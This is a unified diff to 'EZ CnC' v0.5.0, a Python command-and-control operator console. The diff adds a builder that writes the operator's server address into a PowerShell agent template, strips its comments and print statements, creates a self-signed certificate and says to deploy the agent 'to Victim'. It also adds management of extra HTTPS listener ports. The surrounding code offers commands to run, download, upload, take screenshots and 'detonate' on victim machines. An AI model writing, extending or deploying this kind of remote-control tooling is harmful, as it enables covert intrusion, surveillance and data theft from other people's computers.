@@ -1,4 +1,4 @@
-#!/usr/bin/python3 
+#!/usr/bin/env python3 
 
 #########
 ## Version 0.5.0 of the EZ CnC
@@ -52,13 +52,15 @@ import socket
 ######
 ## GLOBAL VARIABLES
 ######
-SLEEP=(5)
-pwd = os.getcwd()
-cc=(pwd + '/WebOnly/cc.js')
-eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py')
-server=(pwd + '/ServerRequirements/server.py')
-lastCommand_input = ''
-lastUser_input = ''
+SLEEP=(5) # Global sleep variable
+pwd = os.getcwd() # Get current working directory
+cc=(pwd + '/WebOnly/cc.js') # path of cc.js
+eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py') # path of eguiHTTPS.py
+server=(pwd + '/ServerRequirements/server.py') # path of the server.py
+lastCommand_input = '' # Keep track of the last command 
+lastUser_input = '' # keep track of the last user input
+additionalPort = int() # Global variable for the While True loop at the bottom
+serverPortList = [] # Server Port List for tracking additional ports
 
 #########
 ## COLOR VARIABLES
@@ -112,7 +114,10 @@ def cleanupFunc():
 
 
 def keyboardFunc():
-    input(green3 + " Press Enter to continue...")
+    try:
+        input(green3 + " Press Enter to continue...")
+    except SyntaxError:
+        pass
 
 def howToFunc():
     # MAYBE
@@ -128,6 +133,10 @@ def howToFunc():
     print((green1 + " Type " \
             + colorBlue + "5" + colorBlack + " to run a script"))
     print((green1 + " Type " \
+            + colorBlue + "6" + colorBlack + " to configure an agent"))
+    print((green1 + " Type " \
+            + colorBlue + "7" + colorBlack + " to change server port"))
+    print((green1 + " Type " \
             + colorBlue + "shell" + colorBlack + " to run a local shell command"))
     print((green1 + " Type " \
             + colorBlue + "detonate" + colorBlack + " to detonate remote agent"))
@@ -138,13 +147,173 @@ def howToFunc():
 def mainLoopFunc(user_input):
     # Main Loop
     # Valid Commands
-    commandList = ['1', '2', '3', '4', '5', 'shell', 'detonate', 'q', 'Q']
-
+    commandList = ['1', '2', '3', '4', '5', '6', '7', 'shell', 'detonate', 'q', 'Q']
+    ## FUNCTION VARIABLES referenced outside of function later
     mainLoopFunc.command_input = ''
+    mainLoopFunc.serverPort = int()
+    ######
+    # Config Variables
+    skeleton = './AgentRequirements/template.ps1'
+    finalAgent = './AgentRequirements/EZCNC-Agent.ps1'
+    finalTemp = './AgentRequirements/finalTemp.ps1'
+    temp = './AgentRequirements/temporary.ps1'
+    cert = "./ServerRequirements/server.pem"
+    # End Config Variables
+    #######
+    # Create Temp File
+    if os.path.exists(temp):
+        None
+    else:
+        f = open(temp,'w')
+        f.close()
+
+    ###
+    # Certificate Func for Agent
+    ###
+    def certificateFunc():
+        while True:
+            user_input = str(input(yellow3 + " Do you wish to create a Self Signed Cert?\n" + yellow2 + " Type 'yes' or 'no'\n"))
+            #print(user_input)
+
+            if user_input.lower() == 'yes':
+                print(green1 + " Generating Self-Signed Certificate...")
+                os.system("openssl req -new -x509 -keyout " + cert + " -out " + cert + " -days 365 -nodes -subj '/C=US' >/dev/null 2>&1")
+                print((green1 + " Certificate created and written to " + cert))
+                break
+            elif user_input.lower() == 'no':
+                print(green1 + " No problem.. but make sure you have your own certificate located in ./ServerRequirements named 'server.pem'")
+                break
+            else:
+                print(red4 + ' Invalid command.. try again')
+                continue
+
+    ###
+    # Cleanup Function - Rename Temp to Final for Agent
+    ###
+    def agentCleanupFunc():
+        if os.path.exists(finalTemp):
+            print(green1 + ' Cleaning up...')
+            #print('[*] Renaming ' + finalTemp + ' to ' + finalAgent)
+            os.rename(finalTemp, finalAgent)
+            print((green1 + ' Final Agent file is located in ' + finalAgent))
+            print(green1 + ' Next Steps..')
+            print('')
+            print((colorBlue + '[1] Deploy ' + finalAgent + ' Agent to Victim' + colorBlack))
+            print((colorBlue + '[2] Run ' + finalAgent + colorBlack))
+            print(colorBlue + '[3] Run commandServer.py to Launch CNC Server and specify the proper Port #' + colorBlack)
+        else:
+            print('temp was never here')
+            None
+
+    ###
+    # Remove Print Statements Function for Agent
+    ###
+    def removePrintStatements():
+        while True:
+            s = open(finalTemp, "r").read() # Open Final Name
+            user_input = str(input(yellow3 + " Do you wish to strip print statements from final Agent File?" + '\n' + yellow2 +  " Type 'yes' or 'no'" + '\n'))
+    
+            #print(user_input)
+            # Print Temp Function Variable
+            printTemp = "printTemp"
+            if user_input.lower() == 'yes':
+                g = open(printTemp, "w")
+                for line in s.splitlines():
+                    if not (line.startswith('Write-Output') or line.startswith('    Write-Output') or line.startswith('        Write-Output') or line.startswith('write-host') or line.startswith('    write-host') or line.startswith('        write-host')):
+                        g.write(line + '\n')
+                g.close()
+                os.rename(printTemp, finalTemp)
+                print(green1 + " Removed Print Statements")
+                #print('[*] Renamed custom ' + printTemp + ' to ' + finalTemp)
+                break
+            elif user_input.lower() == 'no':
+                print(green3 + " Leaving print statements..")
+                break
+            else:
+                print(red4 + " Invalid command.. try again")
+                continue
+
+    ###
+    # Strip Comments Function for Agent
+    ###
+    def stripCommentsFunc():
+        while True:
+            # Vriable for reading finalName
+            #print('[!] Opening Temp File..')
+            s = open(temp, 'r').read()
+            user_input = str(input(yellow3 + " Do you wish to strip comments from final Agent File?" + '\n' + yellow2 + " Type 'yes' or 'no'" + '\n'))
+
+            #print(user_input)
+
+            if user_input.lower() == 'yes':
+                print(green3 + " Commenting out File...")
+
+                # Create SECOND TEMP
+                #print('!] Writing to Final Temp')
+                g = open(finalTemp, "w")
+                for line in s.splitlines():
+                    if not (line.startswith('#') or line.startswith('    #') or line.startswith('        #')):
+                        g.write(line + '\n')
+                g.close()
+                # New Agent created, so delete old agent
+                os.remove(temp)
+                
+                ### REPLACE END COMMENTS WITH #>
+                #print('[!] Now replacing END COMMENTS with #>')
+                with open(finalTemp, 'r') as f:
+                    for line in f:
+                        line = line.replace('END COMMENTS', '#>')
+                        i = open('commentTemp', 'a')
+                        i.write(line)
+                        i.close
+                if os.path.exists('commentTemp'):
+                    os.rename('commentTemp', finalTemp)
+                else:
+                    None # Do Nothing
+                #print('[!] Just created ' + finalTemp + ' and removed ' + temp)
+
+                break
+            elif user_input.lower() == 'no':
+                print(yellow3 + " Leaving comments...")
+                # Rename old file to new agent
+                os.rename(temp, finalTemp)
+                #print('[!] Renaming Print Statement ' + temp + ' to ' + finalTemp)
+                break
+            else:
+                print(red4 + " Invalid command.. try again")
+                continue
+
+    ######
+    ## Add Server Port Function for Agent
+    #####
+    def addServerPortFunc():
+        #sys.stdout.write("[+] What is the IP Address of the Server\n")
+        #sys.stdout.flush()
+        #ip = sys.stdin.readline()
+        print(yellow2 + " What is the IP Address of the Server")
+        ip = str(input(""))
+        print(yellow2 + " What is the Port you want to listen on")
+        port = str(input())
+        print((green3 + ' Server is ' + ip + ':' + port))
+        server = (ip+':'+port)
+
+        # Old line and New Line
+        old = '$ccserver = "192.168.9.4:8080"'
+        new = '$ccserver = "' + server + '"'
+
+        # Open the temporary.ps1 and replace with user input of C&C Server
+        with open(skeleton, 'r') as f:
+            for line in f:
+                line = line.replace(old, new)
+                i = open(temp, 'a')
+                i.write(line)
+                i.close
+        #print('[!] Temporary has been APPENDED with Server:Port')
+
 
     # Command Function
     def command():
-        print('its an command')
+        #print('its an command')
         #print("COMMAND!")
         mainLoopFunc.command_input = input(yellow1 + " What command do you want to run?\n")
 
@@ -161,7 +330,7 @@ def mainLoopFunc(user_input):
     
     # Download Function
     def download():
-        print('its a download')
+        #print('its a download')
         #print(green3 + "DOWNLOAD FROM VICTIM")
         mainLoopFunc.command_input = input(yellow1 + " What file do you want to Download from Victim?\n")
 
@@ -184,7 +353,7 @@ def mainLoopFunc(user_input):
 
 
     def upload():
-        print('its a upload')
+        #print('its a upload')
         #print("UPLOAD TO VICTIM")
         mainLoopFunc.command_input = input(yellow2 + " What file do you want to Upload to Victim?\n")
 
@@ -245,9 +414,11 @@ def mainLoopFunc(user_input):
         time.sleep(20)
         # Read downloaded Screenshot1.bmp (which is base64 encoded) and decode it into a file with dateFile .. save it to Screenshots directory
         f = open(pwd + '/WebOnly/screenshot1.bmp', 'r').read()
-        decoded = base64.b64decode(f)
-        g = open('./Screenshots/' + dateFile, 'w')
-        g.write(decoded)
+        g = open('./Screenshots/' + dateFile, 'wb')
+        
+        decoded = base64.b64decode(f) # g needs to be opened in wb
+        g.write(decoded)# g needs to be opened with wb
+
         g.close()
 
         # Remove screenshot uploaded.. since it is renamed in ./Screenshots/ directory
@@ -401,6 +572,61 @@ def mainLoopFunc(user_input):
 
                     continue
 
+    # Have a way to Add/Remove Ports
+    def serverPort():
+        # Ask if you want to add/remove port
+        mainLoopFunc.command_input = input(yellow2 + " Do you want to " + \
+                colorBlue + "'add'" + colorBlack + \
+                " or " + \
+                colorBlue + "'remove'" + colorBlack + \
+                " a port?\n")
+        #print("Server Port List is: " + str(serverPortList))
+        if mainLoopFunc.command_input == 'add':
+            ######
+            # THIS OPENS A PORT
+            addPort = input(yellow2 + " What port do you want the server to listen on?\n") # changed mainLoopFunc.command_input to "addPort"
+            mainLoopFunc.serverPort = addPort
+            subprocess.Popen(['./ServerRequirements/eguiHTTPS.py', mainLoopFunc.serverPort], shell=False)
+            #print(green3 + " Server is now listening on " + colorGreen + mainLoopFunc.serverPort + colorBlack) # Not needed since eguiHTTPS prints it
+            # END OPEN PORT
+            #######
+            # Appends the opened port to the global list serverPortList
+            serverPortList.append(mainLoopFunc.serverPort)
+            print(green2 + " Adding Port " + mainLoopFunc.serverPort)
+        elif mainLoopFunc.command_input == 'remove':
+            # TODO: create a way to remove port
+            print(yellow1 + " Currently the following ports are listening: ")
+            for port in serverPortList: # Print list of items in "serverPortList" which should be ports started
+                print(colorBlue + str(port) + colorBlack)
+            
+            removePort = input(yellow2 + "Which port do you want to remove?\n")
+            
+            # Loop to make sure it matches
+            if any(item.lower() == removePort.lower() for item in serverPortList):
+                ####################################################
+                ##### ISSUES WITH INDEX RANGE WHEN EMPTYING ########
+                print("Current Server Port List is: " + str(serverPortList))
+                print(red3 + "Removing: " + removePort)
+                serverPortList.remove(removePort) 
+                print("Current Server Port List is now: " + str(serverPortList))
+                print("Still removing " + removePort)
+                PROCNAME = "eguiHTTPS.py"
+                # Prevent IndexError index out of range
+                # Right now there's an index error if you delete in different orders.
+                print("Running kill command first")
+                for proc in psutil.process_iter():
+                    if proc.name() in PROCNAME:
+                        #if str(proc.cmdline()[2]) == str(removePort):
+                        if proc.cmdline()[2] == removePort:
+                            print(green3 + ' Its a match: ' + str(proc.cmdline()[2]))
+                            proc.kill()
+                ###### STILL NOT COMPLETE #########
+                ###################################
+            else:
+                print(red4 + " Didn't match")
+    
+        else:
+            print(red4 + " Not a valid option")
 
     def quit():
         cleanupFunc()
@@ -431,6 +657,16 @@ def mainLoopFunc(user_input):
         panic()
     elif user_input == '5':
         runScripts()
+    elif user_input == '6':
+        # Run the Agent Function list
+        addServerPortFunc()
+        stripCommentsFunc()
+        removePrintStatements()
+        certificateFunc()
+        agentCleanupFunc()
+    elif user_input == '7':
+        print("Still working on this")
+        serverPort()
     elif user_input == 'q':
         quit()
     elif user_input == 'Q':
@@ -445,8 +681,10 @@ def mainLoopFunc(user_input):
 
 def main():
     # CLEAR SCREEN AT START OF SCRIPT
-    _ = os.system('clear')
-    
+    #_ = os.system('clear')
+    # Define Main variable?
+
+
     # ARG PARSER BELOW
     parser = argparse.ArgumentParser()
     parser.add_argument('-p', type=int, default='8000', metavar='<Port Number>',
@@ -510,16 +748,30 @@ if __name__ == "__main__":
         location = ("127.0.0.1", int(main.port))
         result_of_check = a_socket.connect_ex(location)
         if result_of_check == 0:
-            print(("Current Server Port is: " + colorGreen + main.port + colorBlack))
-            print(("Current Server Port is: " + colorGreen + "Open" + colorBlack))
+            print(("Server is listening on Port: " + colorGreen + main.port + colorBlack + \
+                    " and is " + colorGreen + "Open" + colorBlack))
         else:
-            print(("Current Server Port is: " + colorRed + main.port + colorBlack))
-            print(("Current Server Port is: " + colorRed + "Closed" + colorBlack))
+            print(("Server is listening on Port: : " + colorRed + main.port + colorBlack + \
+                    " and is " + colorRed + "Closed" + colorBlack))
 
         a_socket.close()
- 
+
+        # Check if Additional Server Ports are running
+        for port in serverPortList: 
+            a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            location = ("127.0.0.1", int(port))
+            result_of_check = a_socket.connect_ex(location)
+            if result_of_check == 0:
+                print(("Additional listening Port is: " + colorGreen + port + colorBlack + \
+                        " and is " + colorGreen + "Open" + colorBlack))
+            else:
+                print(("Additional listening Port is: " + colorRed + port + colorBlack + \
+                        " and is " + colorRed + "Closed" + colorBlack))
+            a_socket.close()
+
         print('')
 
+        
         howToFunc()
         user_input = str(input(yellow1 + \
 
@@ -528,6 +780,8 @@ if __name__ == "__main__":
                 ", " + colorBlue + "3" + colorBlack + \
                 ", " + colorBlue + "4" + colorBlack + \
                 ", " + colorBlue + "5" + colorBlack + \
+                ", " + colorBlue + "6" + colorBlack + \
+                ", " + colorBlue + "7" + colorBlack + \
                 ", " + colorBlue + "shell" + colorBlack + \
                 ", " + colorBlue + "detonate" + colorBlack + \
                 ", or " + colorBlue + "q" + colorBlack + \
@@ -535,6 +789,9 @@ if __name__ == "__main__":
         mainLoopFunc(user_input)
         lastUser_input = user_input
         lastCommand_input = mainLoopFunc.command_input
+        additionalPort = mainLoopFunc.serverPort
+        #print("additionalPort is: " + str(additionalPort))
+        
         _ = os.system('clear')
     
     # Run the cleanup Function
